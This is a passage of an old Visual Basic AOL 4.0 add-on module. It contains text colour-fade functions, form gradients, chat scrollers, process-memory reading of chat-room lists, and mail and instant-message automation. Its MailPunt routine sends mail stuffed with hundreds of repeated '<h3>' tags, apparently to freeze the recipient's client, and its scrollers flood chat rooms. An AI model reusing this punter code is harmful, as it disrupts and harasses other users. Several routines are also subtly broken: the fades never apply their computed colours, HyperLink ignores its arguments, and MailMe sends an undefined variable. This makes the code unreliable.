        G = RGB(255 - f, f, 255 - f)
        H = RGBtoHEX(G)
        Msg = Msg & "" & D
    Next b
    fadePurpleGreenPurple = Msg
End Function

Function fadePurpleRedPurple(Text1)
    A = Len(Text1)
    For b = 1 To A
        c = Left(Text1, b)
        D = Right(c, 1)
        E = 510 / A
        f = E * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255 - f, 0, 255)
        H = RGBtoHEX(G)
        Msg = Msg & "" & D
    Next b
    fadePurpleRedPurple = Msg
End Function

Function fadePurpleYellowPurple(Text1)
    A = Len(Text1)
    For b = 1 To A
        c = Left(Text1, b)
        D = Right(c, 1)
        E = 510 / A
        f = E * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255 - f, f, 255)
        H = RGBtoHEX(G)
        Msg = Msg & "" & D
    Next b
    fadePurpleYellowPurple = Msg
End Function

Function fadeRedBlackRed(Text1)
    A = Len(Text1)
    For b = 1 To A
        c = Left(Text1, b)
        D = Right(c, 1)
        E = 510 / A
        f = E * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(0, 0, 255 - f)
        H = RGBtoHEX(G)
        Msg = Msg & "" & D
    Next b
    fadeRedBlackRed = Msg
End Function

Function fadeRedBlueRed(Text1)
    A = Len(Text1)
    For b = 1 To A
        c = Left(Text1, b)
        D = Right(c, 1)
        E = 510 / A
        f = E * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(f, 0, 255 - f)
        H = RGBtoHEX(G)
        Msg = Msg & "" & D
    Next b
    fadeRedBlueRed = Msg
End Function

Function fadeRedGreenRed(Text1)
    A = Len(Text1)
    For b = 1 To A
        c = Left(Text1, b)
        D = Right(c, 1)
        E = 510 / A
        f = E * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(0, f, 255 - f)
        H = RGBtoHEX(G)
        Msg = Msg & "" & D
    Next b
    fadeRedGreenRed = Msg
End Function

Function fadeRedPurpleRed(Text1)
    A = Len(Text1)
    For b = 1 To A
        c = Left(Text1, b)
        D = Right(c, 1)
        E = 510 / A
        f = E * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(f, 0, 255)
        H = RGBtoHEX(G)
        Msg = Msg & "" & D
    Next b
    fadeRedPurpleRed = Msg
End Function

Function fadeRedYellowRed(Text1)
    A = Len(Text1)
    For b = 1 To A
        c = Left(Text1, b)
        D = Right(c, 1)
        E = 510 / A
        f = E * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(0, f, 255)
        H = RGBtoHEX(G)
        Msg = Msg & "" & D
    Next b
    fadeRedYellowRed = Msg
End Function

Function fadeYellowBlackYellow(Text1)
    A = Len(Text1)
    For b = 1 To A
        c = Left(Text1, b)
        D = Right(c, 1)
        E = 510 / A
        f = E * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(0, 255 - f, 255 - f)
        H = RGBtoHEX(G)
        Msg = Msg & "" & D
    Next b
    fadeYellowBlackYellow = Msg
End Function

Function fadeYellowBlueYellow(Text1)
    A = Len(Text1)
    For b = 1 To A
        c = Left(Text1, b)
        D = Right(c, 1)
        E = 510 / A
        f = E * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(f, 255 - f, 255 - f)
        H = RGBtoHEX(G)
        Msg = Msg & "" & D
    Next b
    fadeYellowBlueYellow = Msg
End Function

Function fadeYellowGreenYellow(Text1)
    A = Len(Text1)
    For b = 1 To A
        c = Left(Text1, b)
        D = Right(c, 1)
        E = 510 / A
        f = E * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(0, 255, 255 - f)
        H = RGBtoHEX(G)
        Msg = Msg & "" & D
    Next b
    fadeYellowGreenYellow = Msg
End Function

Function fadeYellowPurpleYellow(Text1)
    A = Len(Text1)
    For b = 1 To A
        c = Left(Text1, b)
        D = Right(c, 1)
        E = 510 / A
        f = E * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(f, 255 - f, 255)
        H = RGBtoHEX(G)
        Msg = Msg & "" & D
    Next b
    fadeYellowPurpleYellow = Msg
End Function

Function fadeYellowRedYellow(Text1)
    A = Len(Text1)
    For b = 1 To A
        c = Left(Text1, b)
        D = Right(c, 1)
        E = 510 / A
        f = E * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(0, 255 - f, 255)
        H = RGBtoHEX(G)
        Msg = Msg & "" & D
    Next b
    fadeYellowRedYellow = Msg
End Function


'Preset 2-3 color fade hexcode generator


Function fadeRGBtoHEX(RGB)
    A = Hex(RGB)
    b = Len(A)
    If b = 5 Then A = "0" & A
    If b = 4 Then A = "00" & A
    If b = 3 Then A = "000" & A
    If b = 2 Then A = "0000" & A
    If b = 1 Then A = "00000" & A
    fadeRGBtoHEX = A
End Function


'Form back color fade codes begin here
'Works best when used in the Form_Paint() sub


Sub FadeFormBlue(vForm As Form)
    On Error Resume Next
    Dim intLoop As Integer
    vForm.DrawStyle = vbInsideSolid
    vForm.DrawMode = vbCopyPen
    vForm.ScaleMode = vbPixels
    vForm.DrawWidth = 2
    vForm.ScaleHeight = 256
    For intLoop = 0 To 255
        vForm.Line (0, intLoop)-(Screen.Width, intLoop - 1), RGB(0, 0, 255 - intLoop), B
    Next intLoop
End Sub

Sub FadeFormGreen(vForm As Form)
    On Error Resume Next
    Dim intLoop As Integer
    vForm.DrawStyle = vbInsideSolid
    vForm.DrawMode = vbCopyPen
    vForm.ScaleMode = vbPixels
    vForm.DrawWidth = 2
    vForm.ScaleHeight = 256
    For intLoop = 0 To 255
        vForm.Line (0, intLoop)-(Screen.Width, intLoop - 1), RGB(0, 255 - intLoop, 0), B
    Next intLoop
End Sub

Sub FadeFormGrey(vForm As Form)
    On Error Resume Next
    Dim intLoop As Integer
    vForm.DrawStyle = vbInsideSolid
    vForm.DrawMode = vbCopyPen
    vForm.ScaleMode = vbPixels
    vForm.DrawWidth = 2
    vForm.ScaleHeight = 256
    For intLoop = 0 To 255
        vForm.Line (0, intLoop)-(Screen.Width, intLoop - 1), RGB(255 - intLoop, 255 - intLoop, 255 - intLoop), B
    Next intLoop
End Sub

Sub FadeFormPurple(vForm As Form)
    On Error Resume Next
    Dim intLoop As Integer
    vForm.DrawStyle = vbInsideSolid
    vForm.DrawMode = vbCopyPen
    vForm.ScaleMode = vbPixels
    vForm.DrawWidth = 2
    vForm.ScaleHeight = 256
    For intLoop = 0 To 255
        vForm.Line (0, intLoop)-(Screen.Width, intLoop - 1), RGB(255 - intLoop, 0, 255 - intLoop), B
    Next intLoop
End Sub

Sub FadeFormRed(vForm As Form)
    On Error Resume Next
    Dim intLoop As Integer
    vForm.DrawStyle = vbInsideSolid
    vForm.DrawMode = vbCopyPen
    vForm.ScaleMode = vbPixels
    vForm.DrawWidth = 2
    vForm.ScaleHeight = 256
    For intLoop = 0 To 255
        vForm.Line (0, intLoop)-(Screen.Width, intLoop - 1), RGB(255 - intLoop, 0, 0), B
    Next intLoop
End Sub

Sub FadeFormYellow(vForm As Form)
    On Error Resume Next
    Dim intLoop As Integer
    vForm.DrawStyle = vbInsideSolid
    vForm.DrawMode = vbCopyPen
    vForm.ScaleMode = vbPixels
    vForm.DrawWidth = 2
    vForm.ScaleHeight = 256
    For intLoop = 0 To 255
        vForm.Line (0, intLoop)-(Screen.Width, intLoop - 1), RGB(255 - intLoop, 255 - intLoop, 0), B
    Next intLoop
End Sub

Sub addroomtotext(TheList As ListBox, Text As TextBox)
' addroomtotext list1, text1
Dim Y
Call addroom(TheList)
For Y = 0 To TheList.ListCount - 1
tt$ = tt$ + TheList.List(Y) + ","
Next Y
Timeout (0.01)
Text.Text = tt$

End Sub


Sub aol4_macroScroll(Text As String)
If Mid(Text$, Len(Text$), 1) <> Chr$(10) Then
    Text$ = Text$ + Chr$(13) + Chr$(10)
End If
Do While (InStr(Text$, Chr$(13)) <> 0)
    Counter = Counter + 1
    SendChat Mid(Text$, 1, InStr(Text$, Chr(13)) - 1)
    If Counter = 4 Then
        Timeout (2.9)
        Counter = 0
    End If
    Text$ = Mid(Text$, InStr(Text$, Chr(13) + Chr(10)) + 2)
Loop
End Sub

Sub aol4_SpiralScroll(txt As TextBox)
x = txt.Text
thastar:
Dim MYLEN As Integer
MYSTRING = txt.Text
MYLEN = Len(MYSTRING)
MYSTR = Mid(MYSTRING, 2, MYLEN) + Mid(MYSTRING, 1, 1)
txt.Text = MYSTR
SendChat "•[" + x + "]•"
If txt.Text = x Then
Exit Sub
End If
GoTo thastar

End Sub


Function ScrambleText(thetext)
'sees if there's a space in the text to be scrambled,
'if found space, continues, if not, adds it
findlastspace = Mid(thetext, Len(thetext), 1)

If Not findlastspace = " " Then
thetext = thetext & " "
Else
thetext = thetext
End If

'Scrambles the text
For scrambling = 1 To Len(thetext)
thechar$ = Mid(thetext, scrambling, 1)
Char$ = Char$ & thechar$

If thechar$ = " " Then
'takes out " " space from the text left of the space
chars$ = Mid(Char$, 1, Len(Char$) - 1)
'gets first character
firstchar$ = Mid(chars$, 1, 1)
'gets last character (if not, makes first character only)
On Error GoTo cityz
lastchar$ = Mid(chars$, Len(chars$), 1)
'Full bas by eLeSsDee == eLeSsDee@mindless.com
'finds what is inbetween the last and first character
midchar$ = Mid(chars$, 2, Len(chars$) - 2)
'reverses the text found in between the last and first
'character
For SpeedBack = Len(midchar$) To 1 Step -1
backchar$ = backchar$ & Mid$(midchar$, SpeedBack, 1)
Next SpeedBack
GoTo sniffe

'adds the scrambled text to the full scrambled element
cityz:
Scrambled$ = Scrambled$ & firstchar$ & " "
GoTo sniffs

sniffe:
Scrambled$ = Scrambled$ & lastchar$ & firstchar$ & backchar$ & " "

'clears character and reversed buffers
sniffs:
Char$ = ""
backchar$ = ""
End If

Next scrambling
'Makes function return value the scrambled text
ScrambleText = Scrambled$

Exit Function
End Function

Function HyperLink(txt As String, URL As String)
HyperLink = ("<A HREF=" & Chr$(34) & text2 & Chr$(34) & ">" & Text1 & "</A>")
End Function
Public Function AOLGetList(Index As Long, Buffer As String)
On Error Resume Next

Dim AOLProcess As Long
Dim ListItemHold As Long
Dim person As String
Dim ListPersonHold As Long
Dim ReadBytes As Long
    

room = AOLFindRoom()
aolhandle = FindChildByClass(room, "_AOL_Listbox")

AOLThread = GetWindowThreadProcessId(aolhandle, AOLProcess)
AOLProcessThread = OpenProcess(PROCESS_VM_READ Or STANDARD_RIGHTS_REQUIRED, False, AOLProcess)

If AOLProcessThread Then
person$ = String$(4, vbNullChar)
ListItemHold = SendMessage(aolhandle, LB_GETITEMDATA, ByVal CLng(Index), ByVal 0&)
ListItemHold = ListItemHold + 24
Call ReadProcessMemory(AOLProcessThread, ListItemHold, person$, 4, ReadBytes)
                        
Call RtlMoveMemory(ListPersonHold, ByVal person$, 4)
ListPersonHold = ListPersonHold + 6

person$ = String$(16, vbNullChar)
Call ReadProcessMemory(AOLProcessThread, ListPersonHold, person$, Len(person$), ReadBytes)

person$ = Left$(person$, InStr(person$, vbNullChar) - 1)
Call CloseHandle(AOLProcessThread)
End If

Buffer$ = person$
End Function


Public Function AOLSupRoom()
IsUserOnline
If AOLIsOnline = 0 Then GoTo last
FindChatRoom
If AOLFindRoom = 0 Then GoTo last

On Error Resume Next

Dim AOLProcess As Long
Dim ListItemHold As Long
Dim person As String
Dim ListPersonHold As Long
Dim ReadBytes As Long
    

room = AOLFindRoom()
aolhandle = FindChildByClass(room, "_AOL_Listbox")

AOLThread = GetWindowThreadProcessId(aolhandle, AOLProcess)
AOLProcessThread = OpenProcess(PROCESS_VM_READ Or STANDARD_RIGHTS_REQUIRED, False, AOLProcess)

If AOLProcessThread Then
For Index = 0 To SendMessage(aolhandle, LB_GETCOUNT, 0, 0) - 1
person$ = String$(4, vbNullChar)
ListItemHold = SendMessage(aolhandle, LB_GETITEMDATA, ByVal CLng(Index), ByVal 0&)
ListItemHold = ListItemHold + 24
Call ReadProcessMemory(AOLProcessThread, ListItemHold, person$, 4, ReadBytes)
                        
Call RtlMoveMemory(ListPersonHold, ByVal person$, 4)
ListPersonHold = ListPersonHold + 6

person$ = String$(16, vbNullChar)
Call ReadProcessMemory(AOLProcessThread, ListPersonHold, person$, Len(person$), ReadBytes)

person$ = Left$(person$, InStr(person$, vbNullChar) - 1)
Call SendChat("SuP 2  " & person$)
Timeout (1)
Next Index
Call CloseHandle(AOLProcessThread)
End If
last:
End Function


Public Sub AOLClearChat()
getpar% = FindChatRoom()
child = FindChildByClass(getpar%, "RICHCNTL")
End Sub

Sub AOL40_Keyword(Keyword)
'This will send a keyword through AOL 4.o
tool% = FindChildByClass(AOLWindow(), "AOL Toolbar")
Tool2% = FindChildByClass(tool%, "_AOL_Toolbar")
icon% = FindChildByClass(Tool2%, "_AOL_Icon")
For GetIcon = 1 To 20
icon% = GetWindow(icon%, 2)
Next GetIcon
Call Pause(0.05)
Call ClickIcon(icon%)
Do: DoEvents
MDI% = FindChildByClass(AOLWindow(), "MDIClient")
KeyWordWin% = FindChildByTitle(MDI%, "Keyword")
Edit% = FindChildByClass(KeyWordWin%, "_AOL_Edit")
Icon2% = FindChildByClass(KeyWordWin%, "_AOL_Icon")
Loop Until KeyWordWin% <> 0 And Edit% <> 0 And Icon2% <> 0
Call SendMEssageByString(Edit%, WM_SETTEXT, 0, Keyword)
Call Timeout(0.05)
Call ClickIcon(Icon2%)
Call ClickIcon(Icon2%)
End Sub

Function AOLWindow()
'This sets focus on the AOL window
AOLWindow = FindWindow("AOL Frame25", vbNullString)
End Function


Function Chat_RoomName()
Call GetCaption(AOLFindChatRoom)
End Function

Function FindChildByClass(parentw, childhand)
firs% = GetWindow(parentw, 5)
If UCase(Mid(GetClass(firs%), 1, Len(childhand))) Like UCase(childhand) Then GoTo bone
firs% = GetWindow(parentw, GW_CHILD)
If UCase(Mid(GetClass(firs%), 1, Len(childhand))) Like UCase(childhand) Then GoTo bone

While firs%
firss% = GetWindow(parentw, 5)
If UCase(Mid(GetClass(firss%), 1, Len(childhand))) Like UCase(childhand) Then GoTo bone
firs% = GetWindow(firs%, 2)
If UCase(Mid(GetClass(firs%), 1, Len(childhand))) Like UCase(childhand) Then GoTo bone
Wend
FindChildByClass = 0

bone:
room% = firs%
FindChildByClass = room%

End Function

Function FindChildByTitle(parentw, childhand)
firs% = GetWindow(parentw, 5)
If UCase(GetCaption(firs%)) Like UCase(childhand) Then GoTo bone
firs% = GetWindow(parentw, GW_CHILD)

While firs%
firss% = GetWindow(parentw, 5)
If UCase(GetCaption(firss%)) Like UCase(childhand) & "*" Then GoTo bone
firs% = GetWindow(firs%, 2)
If UCase(GetCaption(firs%)) Like UCase(childhand) & "*" Then GoTo bone
Wend
FindChildByTitle = 0

bone:
room% = firs%
FindChildByTitle = room%
End Function

Function GetClass(child)
Buffer$ = String$(250, 0)
getclas% = GetClassName(child, Buffer$, 250)

GetClass = Buffer$
End Function

Function FindChatRoom()
Aol% = FindWindow("AOL Frame25", vbNullString)
MDI% = FindChildByClass(Aol%, "MDIClient")
room% = FindChildByClass(MDI%, "AOL Child")
Stuff% = FindChildByClass(room%, "_AOL_Listbox")
MoreStuff% = FindChildByClass(room%, "RICHCNTL")
If Stuff% <> 0 And MoreStuff% <> 0 Then
   FindChatRoom = room%
Else:
   FindChatRoom = 0
End If
End Function
Function UserSN()
On Error Resume Next
Aol% = FindWindow("AOL Frame25", "America  Online")
MDI% = FindChildByClass(Aol%, "MDIClient")
Welcome% = FindChildByTitle(MDI%, "Welcome, ")
WelcomeLength% = GetWindowTextLength(Welcome%)
WelcomeTitle$ = String$(200, 0)
A% = GetWindowText(Welcome%, WelcomeTitle$, (WelcomeLength% + 1))
User = Mid$(WelcomeTitle$, 10, (InStr(WelcomeTitle$, "!") - 10))
UserSN = User
End Function

Sub killwait()

Aol% = FindWindow("AOL Frame25", vbNullString)
AOTooL% = FindChildByClass(Aol%, "AOL Toolbar")
AOTool2% = FindChildByClass(AOTooL%, "_AOL_Toolbar")

AOIcon% = FindChildByClass(AOTool2%, "_AOL_Icon")

For GetIcon = 1 To 19
    AOIcon% = GetWindow(AOIcon%, 2)
Next GetIcon

Call Timeout(0.05)
ClickIcon (AOIcon%)

Do: DoEvents
MDI% = FindChildByClass(Aol%, "MDIClient")
KeyWordWin% = FindChildByTitle(MDI%, "Keyword")
AOEdit% = FindChildByClass(KeyWordWin%, "_AOL_Edit")
AOIcon2% = FindChildByClass(KeyWordWin%, "_AOL_Icon")
Loop Until KeyWordWin% <> 0 And AOEdit% <> 0 And AOIcon2% <> 0

Call SendMessage(KeyWordWin%, WM_CLOSE, 0, 0)
End Sub
Function IsUserOnline()
Aol% = FindWindow("AOL Frame25", vbNullString)
MDI% = FindChildByClass(Aol%, "MDIClient")
Welcome% = FindChildByTitle(MDI%, "Welcome,")
If Welcome% <> 0 Then
   IsUserOnline = 1
Else:
   IsUserOnline = 0
End If
End Function
Function GetCaption(hWnd)
hwndLength% = GetWindowTextLength(hWnd)
hwndTitle$ = String$(hwndLength%, 0)
A% = GetWindowText(hWnd, hwndTitle$, (hwndLength% + 1))

GetCaption = hwndTitle$
End Function

Sub ChangeCaption(HWD%, newcaption As String)
Call AOLSetText(HWD%, newcaption)
End Sub

Sub SendChat(Chat)
room% = FindChatRoom
AORich% = FindChildByClass(room%, "RICHCNTL")

AORich% = GetWindow(AORich%, 2)
AORich% = GetWindow(AORich%, 2)
AORich% = GetWindow(AORich%, 2)
AORich% = GetWindow(AORich%, 2)
AORich% = GetWindow(AORich%, 2)
AORich% = GetWindow(AORich%, 2)

Call SetFocusAPI(AORich%)
Call SendMEssageByString(AORich%, WM_SETTEXT, 0, Chat)
DoEvents
Call sendmessagebynum(AORich%, WM_CHAR, 13, 0)
End Sub

Sub ToChat(Chat)
room% = FindChatRoom
AORich% = FindChildByClass(room%, "RICHCNTL")

AORich% = GetWindow(AORich%, 2)
AORich% = GetWindow(AORich%, 2)
AORich% = GetWindow(AORich%, 2)
AORich% = GetWindow(AORich%, 2)
AORich% = GetWindow(AORich%, 2)
AORich% = GetWindow(AORich%, 2)

Call SetFocusAPI(AORich%)
Call SendMEssageByString(AORich%, WM_SETTEXT, 0, Chat)
DoEvents
Call sendmessagebynum(AORich%, WM_CHAR, 13, 0)
End Sub


Sub Timeout(duration)
StartTime = Timer
Do While Timer - StartTime < duration
DoEvents
Loop

End Sub

Sub StayOnTop(theform As Form)
SetWinOnTop = SetWindowPos(theform.hWnd, HWND_TOPMOST, 0, 0, 0, 0, Flags)
End Sub

Sub Anti45MinTimer()
AOTimer% = FindWindow("_AOL_Palette", vbNullString)
AOIcon% = FindChildByClass(AOTimer%, "_AOL_Icon")
ClickIcon (AOIcon%)
End Sub
Public Function AOLFindRoom()
Aol% = FindWindow("AOL Frame25", vbNullString)
MDI% = FindChildByClass(Aol%, "MDIClient")
firs% = GetWindow(MDI%, 5)
listers% = FindChildByClass(firs%, "RICHCNTL")
listere% = GetWindow(listers%, 2)
listerb% = FindChildByClass(firs%, "_AOL_Listbox")
listerc% = FindChildByClass(firs%, "_AOL_Combobox")
If listers% And listere% And listerb% And listerc% Then GoTo bone
AOLFindRoom = 0
GoTo 50
firs% = GetWindow(MDI%, GW_CHILD)
While firs%
firs% = GetWindow(firs%, 2)
listers% = FindChildByClass(firs%, "RICHCNTL")
listere% = GetWindow(listers%, 2)
listerb% = FindChildByClass(firs%, "_AOL_Listbox")
listerc% = FindChildByClass(firs%, "_AOL_Combobox")
If listers% And listere% And listerb% And listerc% Then GoTo bone

Aol% = FindWindow("AOL Frame25", vbNullString)
MDI% = FindChildByClass(Aol%, "MDIClient")
firs% = GetWindow(MDI%, 5)
listers% = FindChildByClass(firs%, "RICHCNTL")
listere% = GetWindow(listers%, 2)
listerb% = FindChildByClass(firs%, "_AOL_Listbox")
listerc% = FindChildByClass(firs%, "_AOL_Combobox")
If listers% And listere% And listerb% And listerc% Then GoTo bone

Wend

bone:
room% = firs%
AOLFindRoom = room%
50
End Function

Sub AntiIdle()
AOModal% = FindWindow("_AOL_Modal", vbNullString)
AOIcon% = FindChildByClass(AOModal%, "_AOL_Icon")
ClickIcon (AOIcon%)
End Sub
Sub ClickIcon(icon%)
click% = SendMessage(icon%, WM_LBUTTONDOWN, 0, 0&)
click% = SendMessage(icon%, WM_LBUTTONUP, 0, 0&)
End Sub
Sub SendMail(Recipiants, Subject, Message)

Aol% = FindWindow("AOL Frame25", vbNullString)
AOTooL% = FindChildByClass(Aol%, "AOL Toolbar")
AOTool2% = FindChildByClass(AOTooL%, "_AOL_Toolbar")
AOIcon% = FindChildByClass(AOTool2%, "_AOL_Icon")

AOIcon% = GetWindow(AOIcon%, 2)

ClickIcon (AOIcon%)

Do: DoEvents
MDI% = FindChildByClass(Aol%, "MDIClient")
AOMail% = FindChildByTitle(MDI%, "Write Mail")
AOEdit% = FindChildByClass(AOMail%, "_AOL_Edit")
AORich% = FindChildByClass(AOMail%, "RICHCNTL")
AOIcon% = FindChildByClass(AOMail%, "_AOL_Icon")
Loop Until AOMail% <> 0 And AOEdit% <> 0 And AORich% <> 0 And AOIcon% <> 0

Call SendMEssageByString(AOEdit%, WM_SETTEXT, 0, Recipiants)

AOEdit% = GetWindow(AOEdit%, 2)
AOEdit% = GetWindow(AOEdit%, 2)
AOEdit% = GetWindow(AOEdit%, 2)
AOEdit% = GetWindow(AOEdit%, 2)
Call SendMEssageByString(AOEdit%, WM_SETTEXT, 0, Subject)
Call SendMEssageByString(AORich%, WM_SETTEXT, 0, Message)

For GetIcon = 1 To 18
    AOIcon% = GetWindow(AOIcon%, 2)
Next GetIcon

ClickIcon (AOIcon%)

Do: DoEvents
AOError% = FindChildByTitle(MDI%, "Error")
AOModal% = FindWindow("_AOL_Modal", vbNullString)
If AOMail% = 0 Then Exit Do
If AOModal% <> 0 Then
AOIcon% = FindChildByClass(AOModal%, "_AOL_Icon")
ClickIcon (AOIcon%)
Call SendMessage(AOMail%, WM_CLOSE, 0, 0)
Exit Sub
End If
If AOError% <> 0 Then
Call SendMessage(AOError%, WM_CLOSE, 0, 0)
Call SendMessage(AOMail%, WM_CLOSE, 0, 0)
Exit Do
End If
Loop
End Sub

Sub MailMe(Recipiants, Subject, Message)

Aol% = FindWindow("AOL Frame25", vbNullString)
AOTooL% = FindChildByClass(Aol%, "AOL Toolbar")
AOTool2% = FindChildByClass(AOTooL%, "_AOL_Toolbar")
AOIcon% = FindChildByClass(AOTool2%, "_AOL_Icon")

AOIcon% = GetWindow(AOIcon%, 2)

ClickIcon (AOIcon%)

Do: DoEvents
MDI% = FindChildByClass(Aol%, "MDIClient")
AOMail% = FindChildByTitle(MDI%, "Write Mail")
AOEdit% = FindChildByClass(AOMail%, "_AOL_Edit")
AORich% = FindChildByClass(AOMail%, "RICHCNTL")
AOIcon% = FindChildByClass(AOMail%, "_AOL_Icon")
Loop Until AOMail% <> 0 And AOEdit% <> 0 And AORich% <> 0 And AOIcon% <> 0

Call SendMEssageByString(AOEdit%, WM_SETTEXT, 0, Recipiants)

AOEdit% = GetWindow(AOEdit%, 2)
AOEdit% = GetWindow(AOEdit%, 2)
AOEdit% = GetWindow(AOEdit%, 2)
AOEdit% = GetWindow(AOEdit%, 2)
Call SendMEssageByString(AOEdit%, WM_SETTEXT, 0, Subject)
Call SendMEssageByString(AORich%, WM_SETTEXT, 0, messege)

For GetIcon = 1 To 18
    AOIcon% = GetWindow(AOIcon%, 2)
Next GetIcon

ClickIcon (AOIcon%)

Do: DoEvents
AOError% = FindChildByTitle(MDI%, "Error")
AOModal% = FindWindow("_AOL_Modal", vbNullString)
If AOMail% = 0 Then Exit Do
If AOModal% <> 0 Then
AOIcon% = FindChildByClass(AOModal%, "_AOL_Icon")
ClickIcon (AOIcon%)
Call SendMessage(AOMail%, WM_CLOSE, 0, 0)
Exit Sub
End If
If AOError% <> 0 Then
Call SendMessage(AOError%, WM_CLOSE, 0, 0)
Call SendMessage(AOMail%, WM_CLOSE, 0, 0)
Exit Do
End If
Loop
End Sub

Sub MailPunt(Recipiants, Subject, Message)
Aol% = FindWindow("AOL Frame25", vbNullString)
AOTooL% = FindChildByClass(Aol%, "AOL Toolbar")
AOTool2% = FindChildByClass(AOTooL%, "_AOL_Toolbar")
AOIcon% = FindChildByClass(AOTool2%, "_AOL_Icon")

AOIcon% = GetWindow(AOIcon%, 2)

ClickIcon (AOIcon%)

Do: DoEvents
MDI% = FindChildByClass(Aol%, "MDIClient")
AOMail% = FindChildByTitle(MDI%, "Write Mail")
AOEdit% = FindChildByClass(AOMail%, "_AOL_Edit")
AORich% = FindChildByClass(AOMail%, "RICHCNTL")
AOIcon% = FindChildByClass(AOMail%, "_AOL_Icon")
Loop Until AOMail% <> 0 And AOEdit% <> 0 And AORich% <> 0 And AOIcon% <> 0

Call SendMEssageByString(AOEdit%, WM_SETTEXT, 0, Text1.Text)

AOEdit% = GetWindow(AOEdit%, 2)
AOEdit% = GetWindow(AOEdit%, 2)
AOEdit% = GetWindow(AOEdit%, 2)
AOEdit% = GetWindow(AOEdit%, 2)
Call SendMEssageByString(AOEdit%, WM_SETTEXT, 0, text2.Text)
Call SendMEssageByString(AORich%, WM_SETTEXT, 0, "<h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3>")
Call SendMEssageByString(AORich%, WM_SETTEXT, 0, "<h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3>")

For GetIcon = 1 To 18
    AOIcon% = GetWindow(AOIcon%, 2)
Next GetIcon

ClickIcon (AOIcon%)

Do: DoEvents
AOError% = FindChildByTitle(MDI%, "Error")
AOModal% = FindWindow("_AOL_Modal", vbNullString)
If AOMail% = 0 Then Exit Do
If AOModal% <> 0 Then
AOIcon% = FindChildByClass(AOModal%, "_AOL_Icon")
ClickIcon (AOIcon%)
Call SendMessage(AOMail%, WM_CLOSE, 0, 0)
Exit Sub
End If
If AOError% <> 0 Then
Call SendMessage(AOError%, WM_CLOSE, 0, 0)
Call SendMessage(AOMail%, WM_CLOSE, 0, 0)
Exit Do
End If
Loop
End Sub

Function FreeProcess()
Do: DoEvents
Process = Process + 1
If Process = 50 Then Exit Do
Loop
End Function


Function WinCaption(win)
WinTextLength% = GetWindowTextLength(win)
WinTitle$ = String$(hwndLength%, 0)
getwintext% = GetWindowText(win, WinTitle$, (WinTextLength% + 1))
WinCaption = WinTitle$
End Function

Sub IMBuddy(Recipiant, Message)

Aol% = FindWindow("AOL Frame25", vbNullString)
MDI% = FindChildByClass(Aol%, "MDIClient")
Buddy% = FindChildByTitle(MDI%, "Buddy List Window")

If Buddy% = 0 Then
    AOL40_Keyword ("BuddyView")
    Do: DoEvents
    Loop Until Buddy% <> 0
End If

AOIcon% = FindChildByClass(Buddy%, "_AOL_Icon")

For L = 1 To 2
    AOIcon% = GetWindow(AOIcon%, 2)
Next L

Call Timeout(0.01)
ClickIcon (AOIcon%)

Do: DoEvents
IMWin% = FindChildByTitle(MDI%, "Send Instant Message")
AOEdit% = FindChildByClass(IMWin%, "_AOL_Edit")
AORich% = FindChildByClass(IMWin%, "RICHCNTL")
